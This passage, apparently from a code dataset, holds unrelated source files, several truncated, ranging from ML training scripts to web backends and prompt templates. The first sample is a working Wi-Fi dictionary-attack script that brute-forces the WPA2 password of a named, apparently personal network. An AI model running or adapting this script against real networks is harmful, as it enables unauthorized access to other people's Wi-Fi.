pywifi.PyWiFi()\r\n    iface = wifi.interfaces()[0]  # Get the primary Wi-Fi adapter\r\n\r\n    # Specify the target SSID\r\n    target_ssid = \"Sagar_Biswas_5.4G\"\r\n\r\n    # Load the password dictionary from the file\r\n    password_file = \"passwords.txt\"  # Path to your passwords file\r\n    password_dict = load_passwords(password_file)\r\n\r\n    # Initiate a scan to gather available networks\r\n    iface.scan()\r\n    time.sleep(5)  # Allow time for the scan to complete\r\n    scan_results = iface.scan_results()\r\n\r\n    # Find the target network by SSID\r\n    target_network = None\r\n    for network in scan_results:\r\n        if network.ssid == target_ssid:\r\n            target_network = network\r\n            break\r\n\r\n    # If the target network is not found, exit\r\n    if target_network is None:\r\n        print(f\"\\n:( Network with SSID '{target_ssid}' not found.\")\r\n    else:\r\n        print(f\"\\n..:: ( \u2022_\u2022) Starting dictionary attack on SSID: {target_network.ssid}\")\r\n\r\n        # Loop through the passwords in the dictionary\r\n        for idx, password in enumerate(password_dict, 1):\r\n            print(f\"\\n==> Trying password {idx}/{len(password_dict)}: '{password}'\")\r\n\r\n            # Create a new profile for the network\r\n            profile = pywifi.Profile()\r\n            profile.ssid = target_ssid  # Set the SSID\r\n            profile.auth = const.AUTH_ALG_OPEN  # Authentication algorithm (open)\r\n            profile.akm.append(const.AKM_TYPE_WPA2PSK)  # WPA2-PSK encryption\r\n            profile.cipher = const.CIPHER_TYPE_CCMP  # Encryption cipher\r\n            profile.key = password  # Current password\r\n\r\n            # Attempt to connect using the profile\r\n            if connect_to_wifi(iface, profile):\r\n                print(f\"\\n..:: ==> :) Password found! SSID: {target_ssid}, Password: {password}\")\r\n                iface.disconnect()\r\n                break\r\n            else:\r\n                print(f\"\\n:( Attempt with password '{password}' failed.\")\r\n        else:\r\n            print(\"\\n \ub208_\ub208 Password not found in dictionary.\")\r\n\r\nexcept Exception as e:\r\n    print(f\"\\n:`( An error occurred: {e}\")\r\n\r\nfinally:\r\n    if iface.status() == const.IFACE_CONNECTED:\r\n        iface.disconnect()\r\n    print(\"\\n...::: Attack finished :::...\\n\")\r\n",
    "import os\nimport jax\nimport equinox as eqx\nimport jax.tree_util as jtu\n\nfrom typing import Mapping\nfrom jax import numpy as jnp\nfrom concurrent.futures import ThreadPoolExecutor\nfrom huggingface_hub import hf_hub_download, HfFileSystem\n\n\nfs = HfFileSystem()\n\n\ndef download_model(model_id: str, num_threads: int = 10) -> Mapping[str, str]:\n    downloaded_files = {}\n\n    if not fs.exists(f\"{model_id}/model.safetensors.index.json\"):\n        downloaded_files[\"model.safetensors\"] = hf_hub_download(model_id, filename=\"model.safetensors\")\n    else:\n        downloaded_files[\"model.safetensors.index.json\"] = hf_hub_download(\n            model_id,\n            filename=\"model.safetensors.index.json\"\n        )\n\n        st_files = fs.glob(f\"{model_id}/model-*.safetensors\")\n        st_file_names = [os.path.basename(f) for f in st_files]\n\n        if num_threads == 1:\n            for st_file in st_file_names:\n                downloaded_files[st_file] = hf_hub_download(model_id, filename=st_file)\n        else:\n            with ThreadPoolExecutor(num_threads) as pool:\n                results = list(pool.map(hf_hub_download, [model_id]*len(st_file_names), st_file_names))\n\n                for st_file, result in zip(st_file_names, results):\n                    downloaded_files[st_file] = result\n\n\n    return downloaded_files\n\n\ndef get_device_array(weight: jnp.ndarray, device: str) -> jnp.ndarray:\n    weight = jnp.array(weight)\n\n    if device == \"cpu\":\n        return weight\n    elif device == \"gpu\":\n        return jax.device_put(weight, jax.devices(\"gpu\")[0])\n    elif device == \"tpu\":\n        return jax.device_put(weight, jax.devices(\"tpu\")[0])\n    else:\n        raise ValueError(f\"Invalid device: {device}\")\n\n\ndef get_state_dict(model):\n    arrays, _ = eqx.partition(model, eqx.is_array)\n    paths_and_values = jtu.tree_flatten_with_path(arrays)[0]\n\n    state_dict = {}\n    for (path, value) in paths_and_values:\n        path_parts = []\n        for p in path:\n            if hasattr(p, 'name'):\n                path_parts.append(p.name)\n            elif hasattr(p, 'idx'):\n                path_parts.append(str(p.idx))\n        path_str = '.'.join(path_parts)\n        state_dict[path_str] = value\n\n    return state_dict\n",
    "import argparse\nimport glob\nimport os\nimport time\nimport warnings\n\nimport torch\n\nfrom tools import init_args\nfrom dataLoader import TrainDataset\nfrom ECAPAModel import ECAPAModel\n\ndef parse_arguments():\n    parser = argparse.ArgumentParser(description=\"ECAPA Trainer\")\n\n    # Training Settings\n    parser.add_argument('--num_frames', type=int, default=300,\n                        help='Duration of the input segments, e.g., 200 for 2 seconds')\n    parser.add_argument('--max_epoch', type=int, default=30,\n                        help='Maximum number of epochs')\n    parser.add_argument('--batch_size', type=int, default=128,\n                        help='Batch size')\n    parser.add_argument('--n_cpu', type=int, default=32,\n                        help='Number of loader threads')\n    parser.add_argument('--test_step', type=int, default=1,\n                        help='Test and save every [test_step] epochs')\n    parser.add_argument('--lr', type=float, default=0.001,\n                        help='Learning rate')\n    parser.add_argument('--lr_decay', type=float, default=0.97,\n                        help='Learning rate decay every [test_step] epochs')\n\n    # Paths and Lists\n    parser.add_argument('--train_list', type=str, default=\"train_list.txt\",\n                        help='Path to the training list')\n    parser.add_argument('--train_path', type=str, default=\"voxceleb1/dev\",\n                        help='Path to the training data')\n    parser.add_argument('--eval_list', type=str, default=\"voxceleb1/voxceleb1_test_v2.txt\",\n                        help='Path to the evaluation list')\n    parser.add_argument('--eval_path', type=str, default=\"voxceleb1/test/\",\n                        help='Path to the evaluation data')\n    parser.add_argument('--musan_path', type=str, default=\"musan/\",\n                        help='Path to the MUSAN dataset')\n    parser.add_argument('--rir_path', type=str, default=\"RIRS_NOISES/simulated_rirs/\",\n                        help='Path to the RIR dataset')\n    parser.add_argument('--save_path', type=str, default=\"exps/vox1\",\n                        help='Path to save scores and models')\n    parser.add_argument('--initial_model', type=str, default=\"\",\n                        help='Path to the initial model')\n\n    # Model and Loss Settings\n    parser.add_argument('--C', type=int, default=1024,\n                        help='Channel size for the speaker encoder')\n    parser.add_argument('--m', type=float, default=0.3,\n                        help='Loss margin in AAM softmax')\n    parser.add_argument('--s', type=float, default=32,\n                        help='Loss scale in AAM softmax')\n    parser.add_argument('--n_class', type=int, default=1211,\n                        help='Number of speakers')\n\n    # Commands\n    parser.add_argument('--eval', action='store_true',\n                        help='Only perform evaluation')\n    parser.add_argument('--visual', action='store_true',\n                        help='Only perform visualization')\n\n    args = parser.parse_args()\n    args = init_args(args)\n    return args\n\ndef main():\n    warnings.simplefilter(\"ignore\")\n    torch.multiprocessing.set_sharing_strategy('file_system')\n\n    args = parse_arguments()\n\n    # Initialize Data Loader\n    train_dataset = TrainDataset(**vars(args))\n    train_dataset_instance = torch.utils.data.DataLoader(\n        train_dataset,\n        batch_size=args.batch_size,\n        shuffle=True,\n        num_workers=args.n_cpu,\n        drop_last=True,\n        pin_memory=True\n    )\n\n    # Model Loading\n    model_files = sorted(glob.glob(f'{args.model_save_path}/model_0*.model'))\n    model = ECAPAModel(**vars(args))\n    epoch = 1\n\n    if args.visual:\n        if not args.initial_model:\n            raise ValueError(\"An initial model must be provided for visualization.\")\n        print(f\"Loading model from {args.initial_model}\")\n        model.load_parameters(args.initial_model)\n        model.visualization(loader=train_dataset_instance)\n        return\n\n    if args.eval:\n        if not args.initial_model:\n            raise ValueError(\"An initial model must be provided for evaluation.\")\n        print(f\"Loading model from {args.initial_model}\")\n        model.load_parameters(args.initial_model)\n        EER, minDCF = model.eval_network(eval_list=args.eval_list, eval_path=args.eval_path)\n        print(f\"EER: {EER:.2f}%, minDCF: {minDCF:.4f}\")\n        return\n\n    if args.initial_model:\n        print(f\"Loading model from {args.initial_model}\")\n        model.load_parameters(args.initial_model)\n    elif model_files:\n        latest_model = model_files[-1]\n        print(f\"Resuming from model {latest_model}\")\n        model.load_parameters(latest_model)\n        epoch = int(os.path.splitext(os.path.basename(latest_model))[0][6:]) + 1\n    else:\n        print(\"Starting training from scratch.\")\n\n    EERs = []\n    minDCFs = []\n\n    score_file_path = os.path.join(args.save_path, \"scores.txt\")\n    with open(score_file_path, \"a+\") as score_file:\n        while ep",
    "import cv2\nimport numpy as np\nimport pandas as pd\nfrom scipy.signal import find_peaks\nfrom datetime import datetime\nimport time\n\n# Eye tracking setup (placeholder for device integration)\ndef initialize_eye_tracker():\n    # Example: Initialize Pupil Labs or Tobii device\n    # Replace with appropriate device SDK initialization\n    print(\"Initializing eye tracker...\")\n    return None\n\n# Function to detect saccades (basic velocity threshold example)\ndef detect_saccades(gaze_data, velocity_threshold=30):\n    \"\"\"\n    Gaze data format: [(timestamp, x, y), ...]\n    velocity_threshold: velocity above which a movement is considered a saccade\n    \"\"\"\n    saccades = []\n    for i in range(1, len(gaze_data)):\n        t1, x1, y1 = gaze_data[i - 1]\n        t2, x2, y2 = gaze_data[i]\n        velocity = np.sqrt((x2 - x1)**2 + (y2 - y1)**2) / (t2 - t1)\n        if velocity > velocity_threshold:\n            saccades.append((t2, x2, y2))\n    return saccades\n\n# Function to log physiological metrics (placeholder for device integration)\ndef log_physiological_metrics():\n    \"\"\"\n    Simulate logging HR, HRV, and SpO2\n    Replace with actual device API integration.\n    \"\"\"\n    hr = np.random.uniform(60, 100)  # Simulate heart rate\n    hrv = np.random.uniform(20, 100)  # Simulate HRV\n    spo2 = np.random.uniform(95, 100)  # Simulate SpO2\n    return {\"hr\": hr, \"hrv\": hrv, \"spo2\": spo2}\n\n# Real-time annotation\ndef annotate_event(event_description):\n    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')\n    print(f\"Annotated Event: {event_description} at {timestamp}\")\n    return {\"timestamp\": timestamp, \"event\": event_description}\n\n# Main live analysis loop\ndef live_analysis():\n    eye_tracker = initialize_eye_tracker()\n    gaze_data = []  # Store gaze points\n    physiological_data = []  # Store HR, HRV, SpO2 data\n    annotations = []  # Store annotations\n\n    print(\"Starting live analysis...\")\n    start_time = time.time()\n\n    try:\n        while True:\n            # Simulate gaze data capture (replace with device API)\n            timestamp = time.time() - start_time\n            x, y = np.random.uniform(0, 1920), np.random.uniform(0, 1080)  # Simulated gaze point\n            gaze_data.append((timestamp, x, y))\n\n            # Detect saccades\n            saccades = detect_saccades(gaze_data)\n\n            # Log physiological metrics\n            phys_data = log_physiological_metrics()\n            physiological_data.append({\"timestamp\": timestamp, **phys_data})\n\n            # Annotate key events (example key press annotation)\n            key = cv2.waitKey(1)\n            if key == ord('a'):  # Press 'a' to annotate\n                annotations.append(annotate_event(\"User pressed 'a'\"))\n\n            # Display real-time metrics\n            print(f\"HR: {phys_data['hr']:.2f}, HRV: {phys_data['hrv']:.2f}, SpO2: {phys_data['spo2']:.2f}\")\n            print(f\"Detected {len(saccades)} saccades so far.\")\n\n            # Break condition (e.g., press 'q' to quit)\n            if key == ord('q'):\n                break\n\n    except KeyboardInterrupt:\n        print(\"Live analysis terminated.\")\n\n    # Save data\n    print(\"Saving data...\")\n    pd.DataFrame(gaze_data, columns=[\"timestamp\", \"x\", \"y\"]).to_csv(\"gaze_data.csv\", index=False)\n    pd.DataFrame(physiological_data).to_csv(\"physiological_data.csv\", index=False)\n    pd.DataFrame(annotations).to_csv(\"annotations.csv\", index=False)\n    print(\"Data saved. Exiting.\")\n\n# Run the live analysis\nif __name__ == \"__main__\":\n    live_analysis()",
    "import os\r\nimport requests\r\nimport json\r\nfrom pymongo import MongoClient\r\nfrom dotenv import load_dotenv\r\nfrom urllib.parse import urlencode\r\nimport time\r\n\r\nload_dotenv()\r\n\r\nBEARER_TOKEN = os.getenv(\"BEARER_TOKEN\")\r\n\r\nif not BEARER_TOKEN:\r\n    raise ValueError(\"Twitter BEARER_TOKEN not set in .env file\")\r\n\r\nclient = MongoClient(\"mongodb://mongodb:27017/\")\r\ndb = client.twitter\r\ncollection = db.tweets\r\n\r\nSEARCH_URL = \"https://api.twitter.com/2/tweets/search/recent\"\r\nHEADERS = {\"Authorization\": f\"Bearer {BEARER_TOKEN}\"}\r\n\r\ndef search_tweets(query, max_results=10):\r\n    \"\"\"Search recent tweets using Twitter API v2.\"\"\"\r\n    params = {\r\n        \"query\": query,\r\n        \"max_results\": max_results,\r\n        \"tweet.fields\": \"id,text,created_at,author_id\",\r\n    }\r\n    url = f\"{SEARCH_URL}?{urlencode(params)}\"\r\n\r\n    try:\r\n        response = requests.get(url, headers=HEADERS)\r\n        response.raise_for_status()\r\n    except requests.exceptions.RequestException as e:\r\n        print(f\"Error fetching tweets: {e}\")\r\n        return []\r\n\r\n    tweets = response.json().get(\"data\", [])\r\n    if tweets:\r\n        collection.insert_many(tweets)\r\n        print(f\"Inserted {len(tweets)} tweets into MongoDB.\")\r\n    return tweets\r\n\r\ndef main():\r\n    query = \"keyword1 OR keyword2\"  \r\n    while True:\r\n        try:\r\n            print(\"Fetching tweets...\")\r\n            search_tweets(query, max_results=10)\r\n            time.sleep(60)  \r\n        except KeyboardInterrupt:\r\n            print(\"Terminating script...\")\r\n            break\r\n        except Exception as e:\r\n            print(f\"An unexpected error occurred: {e}\")\r\n            time.sleep(60)  \r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n",
    "import torch\nfrom torch import nn\nfrom transformers.modeling_outputs import CausalLMOutput, BaseModelOutput\nfrom transformers.models.whisper.modeling_whisper import WhisperEncoder, WhisperEncoderLayer, WHISPER_ATTENTION_CLASSES, \\\n    sinusoids\n\nfrom modeling_dicow import TargetSpeakerAmplifier, CustomLinear, CustomDiagonalLinear\nfrom dicow_config import DiCoWConfig\nfrom interactions import Interaction\n\n\nclass DiCoWEncoder(WhisperEncoder):\n    config_class = DiCoWConfig\n\n    def __init__(self, config: DiCoWConfig):\n        super().__init__(config)\n        if config.additional_layer:\n            self.additional_layer = WhisperEncoderLayer(config)\n        if config.additional_self_attention_layer:\n            self.additional_self_attention_layer = WHISPER_ATTENTION_CLASSES[config._attn_implementation](\n                embed_dim=config.d_model,\n                num_heads=config.encoder_attention_heads,\n                dropout=config.attention_dropout,\n                config=config,\n            )\n        self.ctc_weight = config.ctc_weight\n        if config.sub_sample:\n            self.subsample_conv1 = nn.Conv1d(\n                in_channels=config.d_model,\n                out_channels=config.d_model,\n                kernel_size=3,\n                stride=2,\n                padding=1,\n                bias=False,\n            )\n            self.subsample_conv2 = nn.Conv1d(\n                in_channels=config.d_model,\n                out_channels=config.d_model,\n                kernel_size=3,\n                stride=2,\n                padding=1,\n                bias=False,\n            )\n        self.lm_head = nn.Linear(config.d_model, config.vocab_size + 1, bias=False)\n        self.final_dropout = nn.Dropout(config.final_dropout)\n        if config.use_target_amplifiers:\n            num_amplifiers = self.config.apply_target_amp_to_n_layers if self.config.apply_target_amp_to_n_layers != -1 else len(\n                self.layers)\n            self.target_amplifiers = nn.ModuleList([\n                TargetSpeakerAmplifier(config.d_model,\n                                       non_target_rate=0.0 if i == 0 else 1.0,\n                                       is_diagonal=config.target_amp_is_diagonal,\n                                       bias_only=config.target_amp_bias_only,\n                                       use_silence=config.target_amp_use_silence,\n                                       use_target=config.target_amp_use_target,\n                                       use_overlap=config.target_amp_use_overlap,\n                                       use_non_target=config.target_amp_use_non_target)\n\n                for i in range(num_amplifiers)\n            ])\n        self.first_timestamp_position = self.config.vocab_size - 30 * 50  # 30 seconds of 50 Hz timestamps\n        if config.mt_num_speakers > 1:\n            self.interaction = Interaction(config)\n        self.post_init()\n\n    def _init_weights(self, module):\n        std = self.config.init_std\n        target_amp_init_method = self.config.target_amp_init\n        if isinstance(module, CustomLinear):\n            with torch.no_grad():\n                if target_amp_init_method == 'random':\n                    module.weight.data.normal_(mean=0.0, std=std)\n                    if module.bias is not None:\n                        module.bias.data.normal_(mean=0.0, std=std)\n                elif target_amp_init_method == 'non-disturbing':\n                    module.weight.data = torch.eye(*module.weight.shape).data\n                    if module.bias is not None:\n                        module.bias.data.zero_()\n                elif target_amp_init_method == 'disparagement':\n                    eye = torch.eye(*module.weight.shape)\n                    eye *= module.init_eye_val\n                    module.weight.data = eye.data\n                    if module.bias is not None:\n                        module.bias.data.zero_()\n        elif isinstance(module, CustomDiagonalLinear):\n            with torch.no_grad():\n                if target_amp_init_method == 'random':\n                    module.weight.data.normal_(mean=0.0, std=std)\n                    if module.bias is not None:\n                        module.bias.data.normal_(mean=0.0, std=std)\n                elif target_amp_init_method == 'non-disturbing':\n                    module.weight.data = torch.ones_like(module.weight.data).data\n                    if module.bias is not None:\n                        module.bias.data.zero_()\n                elif target_amp_init_method == 'disparagement':\n                    module.weight.data = module.init_eye_val * torch.ones_like(module.weight.data).data\n                    if module.bias is not None:\n                        module.bias.data.zero_()\n        elif isinstance(module, TargetSpeakerAmplifier):\n            if module.bias_only:\n                if target_amp_init_method == 'random':\n                    module.target_linear.data.normal_(mean=0.0, std=std)\n                    module.n",
    "from asqlite import create_pool\nfrom paste.create import create_new_paste\nfrom paste.delete import delete_paste_by_link\nfrom paste.download import download_paste_by_id\nfrom paste.get import get_paste_by_id, get_raw_paste_by_id\nfrom paste._types import CreateRequest, GetResponse, UpdateRequest\nfrom paste.update import update_existing_paste\nfrom sanic.request import Request\nfrom sanic.response import HTTPResponse, JSONResponse\nfrom sanic_ext import validate\nfrom sanic_limiter import Limiter, get_remote_address # type: ignore\nfrom utils import BackgroundLoops, Config, MyAPI\n\napp = MyAPI(\"pastolotl-backend\")\nlimiter = Limiter(app, key_func = get_remote_address)\n\n@app.before_server_start\nasync def before_start(app: MyAPI) -> None:\n    app.ctx.configs = Config\n    \n    app.ctx.pool = await create_pool(\"../entries/index.sql\")\n    \n    app.ctx.loops = BackgroundLoops(app)\n    app.ctx.loops.start()\n\n@app.after_server_stop\nasync def after_end(app: MyAPI) -> None:\n    await app.ctx.pool.close()\n    \n    app.ctx.loops.end()\n\n@app.post(\"/create/\")\n@validate(json = CreateRequest)\n@limiter.limit(\"6/minute\") # type: ignore # 10s per request\nasync def app_create_new_paste(request: Request, body: CreateRequest) -> JSONResponse:\n    return await create_new_paste(app, body, request.url)\n\n\n@app.get(\"/get/<paste_id>\")\n@limiter.limit(\"20/minute\") # type: ignore # 3s per request\nasync def app_get_paste_by_id(request: Request, paste_id: str) -> GetResponse:\n    return await get_paste_by_id(app, paste_id)\n\n@app.get(\"/raw/<paste_id>\")\n@limiter.limit(\"20/minute\") # type: ignore # 3s per request\nasync def app_get_raw_paste_by_id(request: Request, paste_id: str) -> HTTPResponse:\n    return await get_raw_paste_by_id(app, paste_id)\n\n@app.get(\"/raw/<paste_id>/<filepos>\")\n@limiter.limit(\"20/minute\") # type: ignore # 3s per request\nasync def app_get_raw_file_by_id(request: Request, paste_id: str, filepos: int) -> HTTPResponse:\n    return await get_raw_paste_by_id(app, paste_id, filepos)\n\n\n@app.get(\"/delete/<removal_id>\")\n@limiter.limit(\"10/minute\")  # type: ignore # 6s per request\nasync def app_delete_paste_by_link(request: Request, removal_id: str) -> HTTPResponse:\n    return await delete_paste_by_link(app, removal_id)\n\n\n@app.put(\"/update/\")\n@validate(json = UpdateRequest)\n@limiter.limit(\"3/minute\") # type: ignore\nasync def app_update_existing_paste(request: Request, body: UpdateRequest) -> None:\n    return await update_existing_paste(app, body)\n\n\n@app.get(\"/download/<paste_id>\")\n@limiter.limit(\"2/minute\") # type: ignore\nasync def app_download_paste_by_id(request: Request, paste_id: str) -> HTTPResponse:\n    return await download_paste_by_id(app, paste_id)\n\n@app.get(\"/download/<paste_id>/<filepos>\")\n@limiter.limit(\"2/minute\") # type: ignore\nasync def app_download_single_paste_by_id(request: Request, paste_id: str, filepos: int) -> HTTPResponse:\n    return await download_paste_by_id(app, paste_id, filepos)\n\n\nif __name__ == '__main__':\n    from os import chdir as run_from\n    from subprocess import run\n\n    run_from(\"./backend\")\n    run(\"sanic main:app --debug\".split(' '))",
    "from __future__ import annotations\n\nimport errno\nimport os\nimport socket\nimport ssl\nimport stat\nimport sys\nfrom collections.abc import Awaitable\nfrom ipaddress import IPv6Address, ip_address\nfrom os import PathLike, chmod\nfrom socket import AddressFamily, SocketKind\nfrom typing import TYPE_CHECKING, Any, Literal, cast, overload\n\nfrom .. import to_thread\nfrom ..abc import (\n    ConnectedUDPSocket,\n    ConnectedUNIXDatagramSocket,\n    IPAddressType,\n    IPSockAddrType,\n    SocketListener,\n    SocketStream,\n    UDPSocket,\n    UNIXDatagramSocket,\n    UNIXSocketStream,\n)\nfrom ..streams.stapled import MultiListener\nfrom ..streams.tls import TLSStream\nfrom ._eventloop import get_async_backend\nfrom ._resources import aclose_forcefully\nfrom ._synchronization import Event\nfrom ._tasks import create_task_group, move_on_after\n\nif TYPE_CHECKING:\n    from _typeshed import FileDescriptorLike\nelse:\n    FileDescriptorLike = object\n\nif sys.version_info < (3, 11):\n    from exceptiongroup import ExceptionGroup\n\nif sys.version_info < (3, 13):\n    from typing_extensions import deprecated\nelse:\n    from warnings import deprecated\n\nIPPROTO_IPV6 = getattr(socket, \"IPPROTO_IPV6\", 41)  # https://bugs.python.org/issue29515\n\nAnyIPAddressFamily = Literal[\n    AddressFamily.AF_UNSPEC, AddressFamily.AF_INET, AddressFamily.AF_INET6\n]\nIPAddressFamily = Literal[AddressFamily.AF_INET, AddressFamily.AF_INET6]\n\n\n# tls_hostname given\n@overload\nasync def connect_tcp(\n    remote_host: IPAddressType,\n    remote_port: int,\n    *,\n    local_host: IPAddressType | None = ...,\n    ssl_context: ssl.SSLContext | None = ...,\n    tls_standard_compatible: bool = ...,\n    tls_hostname: str,\n    happy_eyeballs_delay: float = ...,\n) -> TLSStream: ...\n\n\n# ssl_context given\n@overload\nasync def connect_tcp(\n    remote_host: IPAddressType,\n    remote_port: int,\n    *,\n    local_host: IPAddressType | None = ...,\n    ssl_context: ssl.SSLContext,\n    tls_standard_compatible: bool = ...,\n    tls_hostname: str | None = ...,\n    happy_eyeballs_delay: float = ...,\n) -> TLSStream: ...\n\n\n# tls=True\n@overload\nasync def connect_tcp(\n    remote_host: IPAddressType,\n    remote_port: int,\n    *,\n    local_host: IPAddressType | None = ...,\n    tls: Literal[True],\n    ssl_context: ssl.SSLContext | None = ...,\n    tls_standard_compatible: bool = ...,\n    tls_hostname: str | None = ...,\n    happy_eyeballs_delay: float = ...,\n) -> TLSStream: ...\n\n\n# tls=False\n@overload\nasync def connect_tcp(\n    remote_host: IPAddressType,\n    remote_port: int,\n    *,\n    local_host: IPAddressType | None = ...,\n    tls: Literal[False],\n    ssl_context: ssl.SSLContext | None = ...,\n    tls_standard_compatible: bool = ...,\n    tls_hostname: str | None = ...,\n    happy_eyeballs_delay: float = ...,\n) -> SocketStream: ...\n\n\n# No TLS arguments\n@overload\nasync def connect_tcp(\n    remote_host: IPAddressType,\n    remote_port: int,\n    *,\n    local_host: IPAddressType | None = ...,\n    happy_eyeballs_delay: float = ...,\n) -> SocketStream: ...\n\n\nasync def connect_tcp(\n    remote_host: IPAddressType,\n    remote_port: int,\n    *,\n    local_host: IPAddressType | None = None,\n    tls: bool = False,\n    ssl_context: ssl.SSLContext | None = None,\n    tls_standard_compatible: bool = True,\n    tls_hostname: str | None = None,\n    happy_eyeballs_delay: float = 0.25,\n) -> SocketStream | TLSStream:\n    \"\"\"\n    Connect to a host using the TCP protocol.\n\n    This function implements the stateless version of the Happy Eyeballs algorithm (RFC\n    6555). If ``remote_host`` is a host name that resolves to multiple IP addresses,\n    each one is tried until one connection attempt succeeds. If the first attempt does\n    not connected within 250 milliseconds, a second attempt is started using the next\n    address in the list, and so on. On IPv6 enabled systems, an IPv6 address (if\n    available) is tried first.\n\n    When the connection has been established, a TLS handshake will be done if either\n    ``ssl_context`` or ``tls_hostname`` is not ``None``, or if ``tls`` is ``True``.\n\n    :param remote_host: the IP address or host name to connect to\n    :param remote_port: port on the target host to connect to\n    :param local_host: the interface address or name to bind the socket to before\n        connecting\n    :param tls: ``True`` to do a TLS handshake with the connected stream and return a\n        :class:`~anyio.streams.tls.TLSStream` instead\n    :param ssl_context: the SSL context object to use (if omitted, a default context is\n        created)\n    :param tls_standard_compatible: If ``True``, performs the TLS shutdown handshake\n        before closing the stream and requires that the server does this as well.\n        Otherwise, :exc:`~ssl.SSLEOFError` may be raised during reads from the stream.\n        Some protocols, such as HTTP, require this option to be ``False``.\n        See :meth:`~ssl.SSLContext.wrap_socket` for details.\n    :param tls_hostname: host name to check the server certificate against (defaults to\n        the value ",
    "import os\r\nimport warnings\r\nimport streamlit as st\r\nwarnings.filterwarnings(\"ignore\", message=\"Valid config keys have changed in V2\")\r\nos.environ['TF_ENABLE_ONEDNN_OPTS'] = '0'\r\n\r\nfrom smolagents import CodeAgent, DuckDuckGoSearchTool, LiteLLMModel\r\nfrom dotenv import load_dotenv\r\nload_dotenv()\r\n\r\n# Page configuration\r\nst.set_page_config(\r\n    page_title=\"AI Agent Assistant\",\r\n    page_icon=\"\ud83e\udd16\",\r\n    layout=\"wide\"\r\n)\r\n\r\n# Title and description\r\nst.title(\"\ud83e\udd16 AI Agent Assistant\")\r\nst.markdown(\"Ask questions about stocks, weather, or any other information!\")\r\n\r\n# Initialize session state for chat history\r\nif 'chat_history' not in st.session_state:\r\n    st.session_state.chat_history = []\r\n\r\n# Sidebar for API key\r\nwith st.sidebar:\r\n    st.header(\"Configuration\")\r\n    api_key = st.text_input(\"Enter Gemini API Key\", type=\"password\")\r\n    if api_key:\r\n        os.environ['GEMINI_API_KEY'] = api_key\r\n\r\n# Initialize the agent (only if API key is provided)\r\n@st.cache_resource\r\ndef initialize_agent(api_key):\r\n    model = LiteLLMModel(\r\n        model_id=\"gemini/gemini-2.0-flash-exp\",\r\n        api_key=api_key\r\n    )\r\n    search_tool = DuckDuckGoSearchTool()\r\n    return CodeAgent(\r\n        tools=[search_tool], \r\n        model=model,\r\n        additional_authorized_imports=[\"yfinance\"]\r\n    )\r\n\r\n# Main chat interface\r\nuser_input = st.chat_input(\"Type your question here...\")\r\n\r\n# Display chat history\r\nfor message in st.session_state.chat_history:\r\n    with st.chat_message(message[\"role\"]):\r\n        st.write(message[\"content\"])\r\n\r\n# Process new messages\r\nif user_input and api_key:\r\n    # Display user message\r\n    with st.chat_message(\"user\"):\r\n        st.write(user_input)\r\n    st.session_state.chat_history.append({\"role\": \"user\", \"content\": user_input})\r\n    \r\n    # Get and display AI response\r\n    with st.chat_message(\"assistant\"):\r\n        with st.spinner(\"Thinking...\"):\r\n            agent = initialize_agent(api_key)\r\n            try:\r\n                response = agent.run(user_input)\r\n                st.write(response)\r\n                st.session_state.chat_history.append({\"role\": \"assistant\", \"content\": response})\r\n            except Exception as e:\r\n                st.error(f\"An error occurred: {str(e)}\")\r\nelif user_input and not api_key:\r\n    st.warning(\"Please enter your Gemini API key in the sidebar first.\")",
    "# flake8: noqa\nfrom langchain_core.prompts.prompt import PromptTemplate\n\nCYPHER_GENERATION_TEMPLATE = \"\"\"Task:Generate Cypher statement to query a graph database.\nInstructions:\nUse only the provided relationship types and properties in the schema.\nDo not use any other relationship types or properties that are not provided.\nSchema:\n{schema}\nNote: Do not include any explanations or apologies in your responses.\nDo not respond to any questions that might ask anything else than for you to construct a Cypher statement.\nDo not include any text except the generated Cypher statement.\n\nThe question is:\n{question}\"\"\"\n\nCYPHER_GENERATION_PROMPT = PromptTemplate(\n    input_variables=[\"schema\", \"question\"], template=CYPHER_GENERATION_TEMPLATE\n)\n\nCYPHER_QA_TEMPLATE = \"\"\"You are an assistant that helps to form nice and human understandable answers.\nThe information part contains the provided information that you must use to construct an answer.\nThe provided information is authoritative, you must never doubt it or try to use your internal knowledge to correct it.\nMake the answer sound as a response to the question. Do not mention that you based the result on the given information.\nHere is an example:\n\nQuestion: Which managers own Neo4j stocks?\nContext:[manager:CTL LLC, manager:JANE STREET GROUP LLC]\nHelpful Answer: CTL LLC, JANE STREET GROUP LLC owns Neo4j stocks.\n\nFollow this example when generating answers.\nIf the provided information is empty, say that you don't know the answer.\nInformation:\n{context}\n\nQuestion: {question}\nHelpful Answer:\"\"\"\n\nCYPHER_QA_PROMPT = PromptTemplate(\n    input_variables=[\"context\", \"question\"], template=CYPHER_QA_TEMPLATE\n)\n\nKUZU_EXTRA_INSTRUCTIONS = \"\"\"\nInstructions:\nGenerate the K\u00f9zu dialect of Cypher with the following rules in mind:\n1. When matching on a property, use the `LOWER()` function to match the property value.\n2. Do not include triple backticks ``` in your response. Return only Cypher.\n3. Do not return any notes or comments in your response.\n\\n\"\"\"\n\nKUZU_GENERATION_TEMPLATE = CYPHER_GENERATION_TEMPLATE.replace(\n    \"Generate Cypher\", \"Generate K\u00f9zu Cypher\"\n).replace(\"Instructions:\", KUZU_EXTRA_INSTRUCTIONS)\n\nKUZU_GENERATION_PROMPT = PromptTemplate(\n    input_variables=[\"schema\", \"question\"], template=KUZU_GENERATION_TEMPLATE\n)\n",
    "#demo FYI\nimport gradio as gr\nimport os\nimport random\n\nclass MOSApp:\n    MOS = {\n        1: \"1-Bad\", 1.5: \"1.5\", 2: \"2-Poor\", 2.5: \"2.5\", 3: \"3-Fair\",\n        3.5: \"3.5\", 4: \"4-Good\", 4.5: \"4.5\", 5: \"5-Excellent\"\n    }\n\n    def __init__(self):\n        random.seed(10)\n        self.prompt_floder = \"prompts\"\n        \n        # \u52a8\u6001\u68c0\u6d4b\u6a21\u578b\u6587\u4ef6\u5939\n        models_results_path = './models_results'\n        model_folders = [os.path.join(models_results_path, folder) \n                        for folder in os.listdir(models_results_path) \n                        if os.path.isdir(os.path.join(models_results_path, folder))]\n        self.model_folders = sorted(model_folders)\n        \n        # \u83b7\u53d6\u6bcf\u4e2a\u6a21\u578b\u6587\u4ef6\u5939\u4e0b\u7684\u97f3\u9891\u6587\u4ef6\n        self.model_files = {}\n        for folder in self.model_folders:\n            self.model_files[folder] = sorted([os.path.join(folder, file) for file in os.listdir(folder)])\n        \n        # 